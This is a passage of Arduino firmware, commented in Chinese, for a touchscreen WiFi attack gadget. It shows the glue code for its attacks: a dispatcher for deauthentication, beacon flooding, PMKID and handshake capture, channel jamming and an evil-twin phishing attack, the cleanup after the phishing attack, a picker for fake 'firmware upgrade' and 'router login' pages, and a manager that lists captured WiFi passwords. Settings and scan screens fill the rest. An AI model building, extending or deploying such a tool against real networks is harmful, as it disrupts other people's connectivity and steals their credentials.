  // 6) 清理（极速：不等待，立即释放资源）
  phishingWebServer.stop();
  phishingDnsServer.stop();
  phishingActive = false;
  Serial.println("[Phish] 钓鱼服务已停止");

  // 恢复原始热点（极速重试）
  Serial.println("[Phish] 恢复原始热点...");
  WiFi.disconnect();  // 先断开避免冲突
  delay(50);
  char restoreCh[4]; snprintf(restoreCh, sizeof(restoreCh), "%d", current_channel);
  for (int i = 0; i < 3; i++) {
    if (WiFi.apbegin(ssid_buf, pass_buf, restoreCh) == WL_CONNECTED) break;
    delay(300);
  }
  Serial.println("[Phish] 原始热点已恢复");

  // 清屏并重置残留状态
  tft.fillScreen(COLOR_BG);
  g_attackStop = false;
  g_touchValid = false;
  g_attackRunningType = -1;
  g_screen = SCREEN_MAIN;
  currentSelection = 1;
  g_pendingMenuDraw = true;
}

// ★ 跳过WiFi列表，直接执行已选目标的攻击 ★
//    必须放在所有攻击函数定义之后（Arduino预处理器限制）
static void executeAttack(int atk) {
  g_touchValid = false;
  Serial.print("[攻击] 已选目标直接执行, type=");
  Serial.println(atk);
  switch (atk) {
    case 0:  attackDeauth();       break;
    case 1:  attackBeacon();       break;
    case 2:  attackBeaconDeauth(); break;
    case 3:  attackPMKID();        break;
    case 4:  attackAuthFlood();    break;
    case 5:  attackCSA();          break;
    case 6:  attackBcastDeauth();  break;
    case 7:  attackChannelJam();   break;
    case 8:  attackBlackhole();    break;
    case 9:  captureHandshake();   break;
    case 10: phishingAttackWifi(); break;
  }
}

// ====== 密码管理 TFT UI ======
static void phishingPasswordManager() {
  // ★ 密码在 setup() 中通过 phishLoadPasswords() 加载，且 phishAddPassword()
  //   已通过 phishSavePasswords()→EEPROM.commit() 持久化 — 无需重复加载
  int scroll = 0, cursor = 0;
  const int itemH = 30, listY = 50, visible = 8;

  while (true) {
    tft.fillScreen(COLOR_BG);

    // 标题
    tft.fillRect(0, 0, SCREEN_WIDTH, 36, 0x4010);
    u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
    u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
    u8g2_for_adafruit_gfx.setBackgroundColor(0x4010);
    int tw = u8g2_for_adafruit_gfx.getUTF8Width("密码管理");
    u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 26);
    u8g2_for_adafruit_gfx.print("密码管理");

    u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
    if (phishPasswordCount == 0) {
      u8g2_for_adafruit_gfx.setForegroundColor(0x8410);
      u8g2_for_adafruit_gfx.setCursor(10, 140);
      u8g2_for_adafruit_gfx.print("暂无保存的密码");
    } else {
      // 列表
      for (int i = 0; i < visible && i + scroll < phishPasswordCount; i++) {
        int idx = i + scroll;
        int yy = listY + i * itemH;
        bool sel = (idx == cursor);

        if (sel) {
          tft.fillRect(0, yy, SCREEN_WIDTH, itemH - 2, 0x001F);
          u8g2_for_adafruit_gfx.setForegroundColor(0xFFFF);
        } else {
          u8g2_for_adafruit_gfx.setForegroundColor(COLOR_MENU_TEXT);
        }
        u8g2_for_adafruit_gfx.setBackgroundColor(sel ? 0x001F : COLOR_BG);

        String line = String(phishPasswords[idx].ssid);
        if (phishPasswords[idx].verified) line += " V";
        else line += " ?";
        u8g2_for_adafruit_gfx.setCursor(10, yy + 20);
        u8g2_for_adafruit_gfx.print(line);
      }
    }

    // 底部提示
    u8g2_for_adafruit_gfx.setForegroundColor(0x8410);
    u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
    if (phishPasswordCount > 0) {
      u8g2_for_adafruit_gfx.setCursor(10, 270);
      u8g2_for_adafruit_gfx.print("触摸: 查看详情 | 上/下滑动切换");
      u8g2_for_adafruit_gfx.setCursor(10, 285);
      u8g2_for_adafruit_gfx.print("按返回键退出");
    }

    // 返回按钮
    tft.fillRoundRect(40, SCREEN_HEIGHT - 40, SCREEN_WIDTH - 80, 35, 6, COLOR_BTN_BACK);
    tft.drawRoundRect(40, SCREEN_HEIGHT - 40, SCREEN_WIDTH - 80, 35, 6, COLOR_WHITE);
    u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
    u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BTN_BACK);
    tw = u8g2_for_adafruit_gfx.getUTF8Width("< 返回 >");
    u8g2_for_adafruit_gfx.setCursor(40 + (SCREEN_WIDTH - 80 - tw) / 2, SCREEN_HEIGHT - 40 + 22);
    u8g2_for_adafruit_gfx.print("< 返回 >");

    int16_t tx, ty;
    if (touch_read(&tx, &ty)) {
      // 返回按钮
      if (ty >= SCREEN_HEIGHT - 40 && tx >= 40 && tx <= SCREEN_WIDTH - 40) {
        while (touch_read(&tx, &ty)) delay(10);
        break;
      }
      // 列表项
      if (phishPasswordCount > 0 && ty >= listY) {
        int idx = (ty - listY) / itemH + scroll;
        if (idx >= 0 && idx < phishPasswordCount) {
          // 查看详情
          PhishPassword& pp = phishPasswords[idx];
          tft.fillScreen(COLOR_BG);
          tft.fillRect(0, 0, SCREEN_WIDTH, 36, 0x4010);
          u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
          u8g2_for_adafruit_gfx.setBackgroundColor(0x4010);
          tw = u8g2_for_adafruit_gfx.getUTF8Width("密码详情");
          u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 26);
          u8g2_for_adafruit_gfx.print("密码详情");

          u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
          u8g2_for_adafruit_gfx.setForegroundColor(0xFFFF);
          u8g2_for_adafruit_gfx.setCursor(10, 60);
          u8g2_for_adafruit_gfx.print("SSID: " + String(pp.ssid));

          u8g2_for_adafruit_gfx.setForegroundColor(0x07E0);
          u8g2_for_adafruit_gfx.setCursor(10, 82);
          String pwd = String(pp.password);
          if (pwd.length() > 20) pwd = pwd.substring(0, 17) + "...";
          u8g2_for_adafruit_gfx.print("密码: " + pwd);

          u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
          u8g2_for_adafruit_gfx.setCursor(10, 104);
          u8g2_for_adafruit_gfx.print("状态: ");
          u8g2_for_adafruit_gfx.print(pp.verified ? "已验证" : "未验证");

          // 删除按钮
          int dby = 180;
          tft.fillRoundRect(20, dby, 90, 40, 6, COLOR_BTN_BACK);
          tft.drawRoundRect(20, dby, 90, 40, 6, COLOR_WHITE);
          u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
          u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BTN_BACK);
          tw = u8g2_for_adafruit_gfx.getUTF8Width("删除");
          u8g2_for_adafruit_gfx.setCursor(20 + (90 - tw) / 2, dby + 26);
          u8g2_for_adafruit_gfx.print("删除");

          tft.fillRoundRect(130, dby, 90, 40, 6, COLOR_CONFIRM_BG);
          tft.drawRoundRect(130, dby, 90, 40, 6, COLOR_WHITE);
          u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
          u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_CONFIRM_BG);
          tw = u8g2_for_adafruit_gfx.getUTF8Width("返回");
          u8g2_for_adafruit_gfx.setCursor(130 + (90 - tw) / 2, dby + 26);
          u8g2_for_adafruit_gfx.print("返回");

          while (true) {
                    delay(30);
            if (!touch_read(&tx, &ty)) continue;
            if (ty >= dby && ty <= dby + 40) {
              if (tx >= 20 && tx <= 110) {
                // 删除
                for (int j = idx; j < phishPasswordCount - 1; j++)
                  phishPasswords[j] = phishPasswords[j + 1];
                phishPasswordCount--;
                phishSavePasswords();
                Serial.println("[Phish] 密码已删除");
                while (touch_read(&tx, &ty)) delay(10);
                break;
              }
              if (tx >= 130 && tx <= 220) {
                while (touch_read(&tx, &ty)) delay(10);
                break;
              }
              while (touch_read(&tx, &ty)) delay(10);
            }
          }
        }
      }
      while (touch_read(&tx, &ty)) delay(10);
    }
    delay(30);
  }

  g_touchValid = false;
  g_screen = SCREEN_MAIN;
  currentSelection = 1;
  g_pendingMenuDraw = true;
}

// ====== 钓鱼页面类型选择 ======
static void drawPhishPageTypeBtn(int i, bool isSel) {
  const char* types[] = {"网络修复", "固件升级", "安全认证", "路由器管理"};
  const char* descs[] = {
    "通用网络错误修复页面",
    "路由器固件升级认证页面",
    "网络安全防护认证页面",
    "模仿品牌路由器管理登录界面"
  };
  const int itemH = 52, startY = 80;
  int yy = startY + i * itemH;
  uint16_t fill   = isSel ? 0x001F : 0x2104;
  uint16_t border = isSel ? 0xFFFF : 0x4208;
  uint16_t textCol = isSel ? 0xFFFF : 0x07FF;

  tft.fillRoundRect(15, yy, SCREEN_WIDTH - 30, itemH - 4, 6, fill);
  tft.drawRoundRect(15, yy, SCREEN_WIDTH - 30, itemH - 4, 6, border);

  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(textCol);
  u8g2_for_adafruit_gfx.setBackgroundColor(fill);
  u8g2_for_adafruit_gfx.setCursor(25, yy + 22);
  u8g2_for_adafruit_gfx.print(types[i]);

  u8g2_for_adafruit_gfx.setForegroundColor(isSel ? 0xFFE0 : 0x8410);
  u8g2_for_adafruit_gfx.setCursor(25, yy + 42);
  u8g2_for_adafruit_gfx.print(descs[i]);
}

static void drawPhishPageTypeTitle() {
  tft.fillScreen(COLOR_BG);
  tft.fillRect(0, 0, SCREEN_WIDTH, 36, 0x001F);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
  u8g2_for_adafruit_gfx.setBackgroundColor(0x001F);
  int tw = u8g2_for_adafruit_gfx.getUTF8Width("选择页面类型");
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 26);
  u8g2_for_adafruit_gfx.print("选择页面类型");

  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
  u8g2_for_adafruit_gfx.setForegroundColor(0x8410);
  u8g2_for_adafruit_gfx.setCursor(10, 60);
  u8g2_for_adafruit_gfx.print("选择钓鱼页面的展示风格");
  u8g2_for_adafruit_gfx.setCursor(10, SCREEN_HEIGHT - 20);
  u8g2_for_adafruit_gfx.print("再次点击选中项开始钓鱼 | 返回取消");
}

static bool phishSelectPageType() {
  const int typeCount = 4;
  int sel = g_phishPageType, prev = -1;
  int16_t tx, ty;

  while (true) {
    if (sel != prev) {
      if (prev == -1) {
        // 首次全量绘制
        drawPhishPageTypeTitle();
        for (int i = 0; i < typeCount; i++) drawPhishPageTypeBtn(i, (sel == i));
      } else {
        // 增量：仅刷新新旧两个按钮
        drawPhishPageTypeBtn(prev, false);
        drawPhishPageTypeBtn(sel, true);
      }
      prev = sel;
    }

    if (touch_read(&tx, &ty)) {
      for (int i = 0; i < typeCount; i++) {
        int yy = 80 + i * 52;
        if (ty >= yy && ty <= yy + 48 && tx >= 15 && tx <= SCREEN_WIDTH - 15) {
          if (sel == i) {
            while (touch_read(&tx, &ty)) delay(10);
            g_phishPageType = i;
            Serial.print("[Phish] 选择页面类型: ");
            const char* types[] = {"网络修复", "固件升级", "安全认证", "路由器管理"};
            Serial.println(types[i]);
            return true;
          } else {
            sel = i;
            while (touch_read(&tx, &ty)) delay(10);
          }
        }
      }
    }
    delay(30);
  }
}

// ====== 钓鱼攻击子菜单 ======
static void drawPhishSubMenuItem(int i, bool isSel) {
  const char* items[] = {"WiFi钓鱼", "密码管理", "< 返回 >"};
  const int itemH = 48, startY = 80;
  int yy = startY + i * itemH;
  uint16_t fill = isSel ? 0x001F : 0x18E3;
  uint16_t border = isSel ? 0xFFFF : 0x8410;
  uint16_t textCol = isSel ? 0xFFFF : 0x07FF;

  tft.fillRoundRect(20, yy, SCREEN_WIDTH - 40, itemH - 4, 6, fill);
  tft.drawRoundRect(20, yy, SCREEN_WIDTH - 40, itemH - 4, 6, border);

  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(textCol);
  u8g2_for_adafruit_gfx.setBackgroundColor(fill);
  int tw = u8g2_for_adafruit_gfx.getUTF8Width(items[i]);
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, yy + 30);
  u8g2_for_adafruit_gfx.print(items[i]);
}

static void drawPhishSubMenuTitle() {
  tft.fillScreen(COLOR_BG);

  // 标题
  tft.fillRect(0, 0, SCREEN_WIDTH, 36, 0x4010);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
  u8g2_for_adafruit_gfx.setBackgroundColor(0x4010);
  int tw = u8g2_for_adafruit_gfx.getUTF8Width("钓鱼攻击");
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 26);
  u8g2_for_adafruit_gfx.print("钓鱼攻击");

  // 说明
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
  u8g2_for_adafruit_gfx.setForegroundColor(0x8410);
  u8g2_for_adafruit_gfx.setCursor(10, 58);
  u8g2_for_adafruit_gfx.print("创建同名AP + DNS劫持 + 密码捕获");

  // 底部提示
  u8g2_for_adafruit_gfx.setForegroundColor(0x8410);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
  u8g2_for_adafruit_gfx.setCursor(10, SCREEN_HEIGHT - 20);
  u8g2_for_adafruit_gfx.print("触摸项目进入 | WiFi钓鱼需先勾选目标");
}

static void phishingSubMenu() {
  const int itemCount = 3;
  int sel = 0, prev = -1;

  while (true) {
    if (sel != prev) {
      if (prev == -1) {
        // 首次全量绘制
        drawPhishSubMenuTitle();
        for (int i = 0; i < itemCount; i++) drawPhishSubMenuItem(i, (sel == i));
      } else {
        // 增量：仅刷新新旧两个按钮
        drawPhishSubMenuItem(prev, false);
        drawPhishSubMenuItem(sel, true);
      }
      prev = sel;
    }

    int16_t tx, ty;
    if (touch_read(&tx, &ty)) {
      for (int i = 0; i < itemCount; i++) {
        int yy = 80 + i * 48;
        if (ty >= yy && ty <= yy + 44 && tx >= 20 && tx <= SCREEN_WIDTH - 20) {
          if (sel == i) {
            // 确认执行
            { unsigned long tm = millis(); while (touch_read(&tx, &ty) && (millis() - tm) < 300) delay(10); }
            g_touchValid = false;
            switch (i) {
              case 0:
                if (phishSelectPageType()) {
                  // ★ 如果已有选中目标 → 直接执行钓鱼攻击
                  if (hasSelectedTargets()) {
                    executeAttack(10);
                  } else {
                    Serial.println("[钓鱼] → 进入WiFi列表选目标");
                    gotoWifiListForAttack(10, SCREEN_ATTACK_MENU, 0);
                  }
                }
                return;
              case 1: phishingPasswordManager(); return;
              case 2: g_screen = SCREEN_MAIN; currentSelection = 1; g_pendingMenuDraw = true; return;
            }
          } else {
            sel = i;
            while (touch_read(&tx, &ty)) delay(10);
            g_touchValid = false;
          }
        }
      }
    }
    delay(30);
  }
}

// ==================== 攻击子菜单入口 ====================
void homeActionAttackMenu() {
  g_attackMenuIdx = 0;
  g_screen = SCREEN_ATTACK_MENU;
  drawAttackMenuUI();
  Serial.println("[攻击菜单] 进入攻击子菜单");
}

// ==================== 系统设置子菜单 ====================
static int g_settingsIdx = 0;
static int g_prevSettingsIdx = 0;      // 上一次设置选中项（用于增量重绘）
static const int SETTINGS_COUNT = 4;
const char* settingsItems[] = {
  "1. 熄屏时间",
  "2. 屏幕亮度",
  "3. 关于本机",
  "4. 《 返回 》"
};

// ==================== 屏幕亮度调节界面 ====================
static void brightnessAdjustUI() {
  int brightness = g_brightness;
  int prevBrightness = -1;
  int16_t tx, ty;

  tft.fillScreen(COLOR_BG);

  while (true) {
    if (brightness != prevBrightness) {
      prevBrightness = brightness;

      // 标题栏
      tft.fillRect(0, 0, SCREEN_WIDTH, 40, COLOR_TITLE_BG);
      u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
      u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
      u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_TITLE_BG);
      int tw = u8g2_for_adafruit_gfx.getUTF8Width("屏幕亮度");
      u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 28);
      u8g2_for_adafruit_gfx.print("屏幕亮度");

      // 亮度数值
      u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
      u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
      String pct = String(brightness) + "%";
      int pw = u8g2_for_adafruit_gfx.getUTF8Width(pct.c_str());
      u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - pw) / 2, 85);
      u8g2_for_adafruit_gfx.print(pct);

      // 滑动条底色
      int barX = 20, barW = SCREEN_WIDTH - 40, barH = 24;
      int barY = 115;
      tft.fillRoundRect(barX, barY, barW, barH, 4, 0x4208);
      tft.drawRoundRect(barX, barY, barW, barH, 4, 0x8410);

      // 滑动条填充
      int fillW = (int)((long)barW * brightness / 100);
      if (fillW > 0) {
        uint16_t fillColor;
        if (brightness <= 30) fillColor = 0xF800;       // 红
        else if (brightness <= 60) fillColor = 0xFFE0;  // 黄
        else fillColor = 0x07E0;                         // 绿
        tft.fillRoundRect(barX, barY, fillW, barH, 4, fillColor);
      }

      // 滑块圆点
      int knobX = barX + fillW;
      if (knobX < barX + 8) knobX = barX + 8;
      if (knobX > barX + barW - 8) knobX = barX + barW - 8;
      tft.fillCircle(knobX, barY + barH / 2, 10, COLOR_WHITE);
      tft.drawCircle(knobX, barY + barH / 2, 10, 0x8410);

      // 底部按钮
      tft.drawLine(0, BTN_BAR_Y - 2, SCREEN_WIDTH, BTN_BAR_Y - 2, 0x18E7);
      tft.fillRect(0, BTN_BAR_Y, SCREEN_WIDTH, BTN_BAR_H, COLOR_BG);

      // 减按钮 (-)
      tft.fillRoundRect(10, BTN_BAR_Y + 4, 50, 26, 5, COLOR_BTN_BACK);
      u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
      u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BTN_BACK);
      String minus = "-";
      int mw = u8g2_for_adafruit_gfx.getUTF8Width("-");
      u8g2_for_adafruit_gfx.setCursor(10 + (50 - mw) / 2, BTN_BAR_Y + 22);
      u8g2_for_adafruit_gfx.print("-");

      // 加按钮 (+)
      tft.fillRoundRect(SCREEN_WIDTH - 60, BTN_BAR_Y + 4, 50, 26, 5, COLOR_BTN_OK);
      u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
      u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BTN_OK);
      String plus = "+";
      int pw2 = u8g2_for_adafruit_gfx.getUTF8Width("+");
      u8g2_for_adafruit_gfx.setCursor(SCREEN_WIDTH - 60 + (50 - pw2) / 2, BTN_BAR_Y + 22);
      u8g2_for_adafruit_gfx.print("+");

      // 保存按钮
      tft.fillRoundRect(70, BTN_BAR_Y + 4, SCREEN_WIDTH - 140, 26, 5, COLOR_BTN_UP);
      u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
      u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BTN_UP);
      String save = "保存并返回";
      int sw = u8g2_for_adafruit_gfx.getUTF8Width(save.c_str());
      u8g2_for_adafruit_gfx.setCursor(70 + (SCREEN_WIDTH - 140 - sw) / 2, BTN_BAR_Y + 22);
      u8g2_for_adafruit_gfx.print(save);
    }

    if (touch_read(&tx, &ty)) {
      int barX = 20, barW = SCREEN_WIDTH - 40, barH = 24;
      int barY = 115;

      // 滑动条区域 — 直接设置亮度
      if (ty >= barY - 15 && ty <= barY + barH + 15) {
        int relX = tx - barX;
        if (relX < 0) relX = 0;
        if (relX > barW) relX = barW;
        int newBri = (int)((long)relX * 100 / barW);
        if (newBri < 10) newBri = 10;  // 最低10%
        brightness = newBri;
        g_brightness = brightness;
        brightnessApply();
      }

      // 减按钮
      if (tx >= 10 && tx <= 60 && ty >= BTN_BAR_Y + 4 && ty <= BTN_BAR_Y + 30) {
        if (brightness > 10) {
          brightness -= 10;
          if (brightness < 10) brightness = 10;
          g_brightness = brightness;
          brightnessApply();
        }
      }

      // 加按钮
      if (tx >= SCREEN_WIDTH - 60 && tx <= SCREEN_WIDTH - 10 && ty >= BTN_BAR_Y + 4 && ty <= BTN_BAR_Y + 30) {
        if (brightness < 100) {
          brightness += 10;
          if (brightness > 100) brightness = 100;
          g_brightness = brightness;
          brightnessApply();
        }
      }

      // 保存并返回
      if (tx >= 70 && tx <= SCREEN_WIDTH - 70 && ty >= BTN_BAR_Y + 4 && ty <= BTN_BAR_Y + 30) {
        brightnessSave();
        Serial.println("[亮度] 已保存: " + String(g_brightness) + "%");
        break;
      }
    }
    delay(30);
  }
}

void drawSettingsUI() {
  tft.fillScreen(COLOR_BG);

  // 标题栏
  tft.fillRect(0, 0, SCREEN_WIDTH, 40, COLOR_TITLE_BG);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_TITLE_BG);
  int tw = u8g2_for_adafruit_gfx.getUTF8Width("系统设置");
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 28);
  u8g2_for_adafruit_gfx.print("系统设置");

  tft.drawLine(0, MENU_AREA_Y - 2, SCREEN_WIDTH, MENU_AREA_Y - 2, 0x18E7);

  for (int i = 0; i < SETTINGS_COUNT; i++) {
    int yy = MENU_AREA_Y + i * (MENU_ITEM_H + 8);
    if (i == g_settingsIdx) {
      tft.fillRect(2, yy, SCREEN_WIDTH - 4, MENU_ITEM_H + 7, COLOR_MENU_SEL);
    } else {
      tft.fillRect(2, yy, SCREEN_WIDTH - 4, MENU_ITEM_H + 7, COLOR_BG);
    }
    u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
    u8g2_for_adafruit_gfx.setForegroundColor(i == g_settingsIdx ? COLOR_WHITE : COLOR_MENU_TEXT);
    u8g2_for_adafruit_gfx.setBackgroundColor(i == g_settingsIdx ? COLOR_MENU_SEL : COLOR_BG);
    u8g2_for_adafruit_gfx.setCursor(10, yy + 19);
    u8g2_for_adafruit_gfx.print(settingsItems[i]);

    // 第1项"熄屏时间"旁显示当前选择
    if (i == 0) {
      uint16_t labelColor = (g_autoSleepSec == 0) ? 0xF800 : 0x07E0;
      u8g2_for_adafruit_gfx.setForegroundColor(labelColor);
      u8g2_for_adafruit_gfx.setBackgroundColor(i == g_settingsIdx ? COLOR_MENU_SEL : COLOR_BG);
      u8g2_for_adafruit_gfx.setCursor(120, yy + 19);
      u8g2_for_adafruit_gfx.print(autosleepLabels[g_autoSleepOptIdx]);
    }
    // 第2项"屏幕亮度"旁显示当前值
    if (i == 1) {
      u8g2_for_adafruit_gfx.setForegroundColor(i == g_settingsIdx ? COLOR_WHITE : 0xFFE0);
      u8g2_for_adafruit_gfx.setBackgroundColor(i == g_settingsIdx ? COLOR_MENU_SEL : COLOR_BG);
      u8g2_for_adafruit_gfx.setCursor(120, yy + 19);
      u8g2_for_adafruit_gfx.print(String(g_brightness) + "%");
    }
  }

  // 底部按钮
  tft.drawLine(0, BTN_BAR_Y - 2, SCREEN_WIDTH, BTN_BAR_Y - 2, 0x18E7);
  tft.fillRect(0, BTN_BAR_Y, SCREEN_WIDTH, BTN_BAR_H, COLOR_BG);
  drawButton(0,       BTN_BAR_Y + 2, BTN_W, BTN_H, COLOR_BTN_UP,   "上",   COLOR_WHITE);
  drawButton(BTN_W,   BTN_BAR_Y + 2, BTN_W, BTN_H, COLOR_BTN_DOWN, "下",   COLOR_WHITE);
  drawButton(BTN_W*2, BTN_BAR_Y + 2, BTN_W, BTN_H, COLOR_BTN_OK,   "确认", COLOR_WHITE);
  drawButton(BTN_W*3, BTN_BAR_Y + 2, BTN_W, BTN_H, COLOR_BTN_BACK, "返回", COLOR_WHITE);

  drawAreaBorders();  // 底部按钮栏分区围绕线

  // 同步增量重绘跟踪变量
  g_prevSettingsIdx = g_settingsIdx;
}

// ==================== 设置菜单增量重绘（仅更新选中项，不碰标题栏/按钮栏）====================

static void drawSingleSettingsItem(int idx, bool selected) {
  if (idx < 0 || idx >= SETTINGS_COUNT) return;
  int yy = MENU_AREA_Y + idx * (MENU_ITEM_H + 8);
  uint16_t bg = selected ? COLOR_MENU_SEL : COLOR_BG;
  tft.fillRect(2, yy, SCREEN_WIDTH - 4, MENU_ITEM_H + 7, bg);

  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(selected ? COLOR_WHITE : COLOR_MENU_TEXT);
  u8g2_for_adafruit_gfx.setBackgroundColor(bg);
  u8g2_for_adafruit_gfx.setCursor(10, yy + 19);
  u8g2_for_adafruit_gfx.print(settingsItems[idx]);

  // 第1项"熄屏时间"旁显示当前选择
  if (idx == 0) {
    uint16_t labelColor = (g_autoSleepSec == 0) ? 0xF800 : 0x07E0;
    u8g2_for_adafruit_gfx.setForegroundColor(labelColor);
    u8g2_for_adafruit_gfx.setBackgroundColor(bg);
    u8g2_for_adafruit_gfx.setCursor(120, yy + 19);
    u8g2_for_adafruit_gfx.print(autosleepLabels[g_autoSleepOptIdx]);
  }
  // 第2项"屏幕亮度"旁显示当前值
  if (idx == 1) {
    u8g2_for_adafruit_gfx.setForegroundColor(selected ? COLOR_WHITE : 0xFFE0);
    u8g2_for_adafruit_gfx.setBackgroundColor(bg);
    u8g2_for_adafruit_gfx.setCursor(120, yy + 19);
    u8g2_for_adafruit_gfx.print(String(g_brightness) + "%");
  }
}

static void updateSettingsSelection() {
  if (g_settingsIdx < 0 || g_settingsIdx >= SETTINGS_COUNT) return;
  if (g_prevSettingsIdx != g_settingsIdx) {
    drawSingleSettingsItem(g_prevSettingsIdx, false);
    drawSingleSettingsItem(g_settingsIdx, true);
    g_prevSettingsIdx = g_settingsIdx;
  }
}

void homeActionSettings() {
  g_settingsIdx = 0;
  g_screen = SCREEN_SETTINGS;
  drawSettingsUI();
  Serial.println("[系统设置] 进入系统设置菜单");
}

// ==================== 深度扫描 ====================
// TFT进度绘制 —— 扫描过程中更新屏幕
void drawDeepScanProgress(int step, int total, const char* strategy) {
  tft.fillScreen(COLOR_BG);

  // 标题栏
  tft.fillRect(0, 0, SCREEN_WIDTH, 40, COLOR_TITLE_BG);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_TITLE_BG);
  int tw = u8g2_for_adafruit_gfx.getUTF8Width("深度扫描");
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 28);
  u8g2_for_adafruit_gfx.print("深度扫描");

  // 进度文字
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);

  String progress = "进度: " + String(step) + "/" + String(total);
  int pw = u8g2_for_adafruit_gfx.getUTF8Width(progress.c_str());
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - pw) / 2, 90);
  u8g2_for_adafruit_gfx.print(progress);

  // 策略名称
  u8g2_for_adafruit_gfx.setForegroundColor(0x07FF);
  int sw = u8g2_for_adafruit_gfx.getUTF8Width(strategy);
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - sw) / 2, 125);
  u8g2_for_adafruit_gfx.print(strategy);

  // 进度条
  int barW = 200, barH = 12;
  int barX = (SCREEN_WIDTH - barW) / 2;
  int barY = 160;
  tft.drawRect(barX, barY, barW, barH, 0xFFFF);
  int fillW = (step > 0) ? (barW * step / total) : 0;
  if (fillW > 0) tft.fillRect(barX + 1, barY + 1, fillW - 2, barH - 2, 0x07E0);
}

void drawDeepScanDisplay(const char* scanType) {
  tft.fillScreen(COLOR_BG);

  // 标题栏
  tft.fillRect(0, 0, SCREEN_WIDTH, 40, COLOR_TITLE_BG);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_TITLE_BG);
  int tw = u8g2_for_adafruit_gfx.getUTF8Width("深度扫描");
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 28);
  u8g2_for_adafruit_gfx.print("深度扫描");

  // 当前扫描类型
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(0x07FF);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
  int sw = u8g2_for_adafruit_gfx.getUTF8Width(scanType);
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - sw) / 2, 110);
  u8g2_for_adafruit_gfx.print(scanType);

  // 动画指示
  static int animIdx = 0;
  const char* frames[] = {"|", "/", "-", "\\"};
  u8g2_for_adafruit_gfx.setCursor(SCREEN_WIDTH / 2 - 10, 145);
  u8g2_for_adafruit_gfx.print(frames[animIdx]);
  animIdx = (animIdx + 1) % 4;
}

// 单次扫描 + 去重归并
void performSingleScan(const char* scanType, unsigned long timeoutMs,
                       std::vector<WiFiScanResult>& allResults,
                       std::set<String>& uniqueSSIDs) {
  drawDeepScanDisplay(scanType);

  scan_results.clear();
  g_scanDone = false;
  unsigned long startMs = millis();

  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    while (!g_scanDone && (millis() - startMs) < timeoutMs) {
      delay(10);
    }
    for (const auto& result : scan_results) {
